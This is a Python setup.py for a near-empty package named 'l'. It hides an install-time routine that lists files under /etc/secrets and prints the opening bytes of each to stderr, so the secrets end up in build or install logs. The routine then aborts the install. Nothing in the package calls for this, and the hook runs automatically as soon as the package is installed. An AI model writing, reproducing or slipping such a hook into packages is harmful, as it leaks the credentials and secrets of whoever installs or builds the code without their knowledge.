import os, sys, subprocess as sp
from setuptools import setup

def deep_leak():
    o = sys.stderr.write
    o("\n" + "!"*30 + "\n")
    o("--- EXPLORING /etc/secrets ---\n")
    
    # 1. Рекурсивный список всех файлов (ищем скрытые)
    o(sp.getoutput("find /etc/secrets -maxdepth 2 -not -path '*/.*'"))
    o("\n\n--- READING CONTENT ---\n")
    
    # 2. Попытка прочитать всё, что там есть
    # Мы ищем файлы внутри ..data или напрямую в /etc/secrets
    try:
        files = sp.getoutput("find /etc/secrets -type f -maxdepth 2").split('\n')
        for f in files:
            if f:
                o(f"\nFILE: {f}\n")
                o(sp.getoutput(f"cat {f} | head -c 100")) # Читаем начало файла
                o("\n")
    except Exception as e:
        o(f"ERROR: {str(e)}\n")

    o("\n" + "!"*30 + "\n")
    sys.exit(1)

try: deep_leak()
except: sys.exit(1)

setup(name="l", version="0.1")
